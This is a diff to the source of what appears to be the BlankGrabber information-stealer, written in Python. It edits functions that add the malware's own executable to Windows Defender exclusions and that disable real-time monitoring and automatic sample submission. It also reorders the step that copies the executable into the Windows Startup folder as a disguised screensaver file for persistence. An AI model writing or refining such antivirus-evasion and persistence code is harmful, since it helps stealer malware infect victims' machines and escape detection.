@@ -58,10 +58,10 @@ def wd_exclude(path= None):
             path = sys.executable
         else:
             path = os.path.abspath(__file__)
-    subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)
+    subprocess.run(f"powershell -Command Add-MpPreference -ExclusionPath '{path}'", shell= True, capture_output= True)
 
 def disable_wd():
-    windef = "powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off"
+    windef = "powershell Set-MpPreference -DisableRealtimeMonitoring $true && powershell Set-MpPreference -SubmitSamplesConsent 2"
     subprocess.run(windef, shell= True, capture_output= True)
 
 def generate(num=5, invisible= False):
@@ -680,8 +680,8 @@ if __name__ == "__main__":
                 if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                     try:
                         exepath = os.path.join("C:/ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
-                        BlankGrabber.copy("Blank", sys.executable, exepath)
                         wd_exclude(exepath)
+                        BlankGrabber.copy("Blank", sys.executable, exepath)
                     except Exception:
                         pass
 
